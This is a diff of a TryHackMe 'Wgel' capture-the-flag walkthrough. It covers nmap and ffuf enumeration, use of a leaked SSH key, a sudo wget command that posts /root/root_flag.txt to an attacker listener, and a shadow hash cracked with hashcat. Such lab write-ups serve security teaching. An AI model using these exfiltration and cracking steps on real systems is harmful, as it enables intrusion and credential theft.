@@ -6,15 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="wgel.png" alt="wgel" width=200/>
+{{< post-img src="wgel.png" alt="Wgel CTF" style="width:200px" >}}
+
 
 ## Enumeration
 
-### nmap
-```
+```nmap
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
 |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
@@ -22,7 +22,7 @@ PORT   STATE SERVICE REASON  VERSION
 |   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
 80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Apache2 Ubuntu Default Page: It works
 |_http-server-header: Apache/2.4.18 (Ubuntu)
@@ -30,8 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### ffuf
-```
+```ffuf
 .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -49,24 +48,22 @@ images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
 js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
 ```
 
-visit `sitemap` directory and get to unapp template page
-
-we fuzz again and in `.ssh` dir you have an `id_rsa` key
+visit `sitemap` directory and get to "unapp" template page
+fuzz again and in `.ssh` dir you have an `id_rsa` key
 
 we know what to do
 
-```
+```bash
 └──╼ $python2 /usr/share/john/ssh2john.py -w=/usr/share/wordlists/rockyou.txt id_rsa > id_john
 id_rsa has no password!
 ```
 
-wait what? I don't even know who to ssh as...let's go back
-
+wait what? I don't even know what user I should ssh as...let's go back
 folks you remember how we insist all the time on ALWAYS checking source code?
 
 It was in `/index.html`...yes that default index page for apache servers
 
-```
+```html
         <pre>
 /etc/apache2/
 |-- apache2.conf
@@ -101,7 +98,7 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
 8 packages can be updated.
 8 updates are security updates.
 
-jessie@CorpOne:~$ 
+jessie@CorpOne:~$
 ```
 
 ```
@@ -135,7 +132,7 @@ set a netcat listener on your side
 jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.226.203:2311
 --2021-11-27 15:27:02--  http://10.8.226.203:2311/
 Connecting to 10.8.226.203:2311... connected.
-HTTP request sent, awaiting response... 
+HTTP request sent, awaiting response...
 ```
 
 ```
@@ -173,7 +170,7 @@ sshd:*:18195:0:99999:7:::
 ```
 ha! jessie's hash! those are crackable!
 
-looks like sha-512crypt 
+looks like sha-512crypt
 
 ```
 └──╼ $hashcat -m 1800 '$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.' /usr/share/wordlists/rockyou.txt
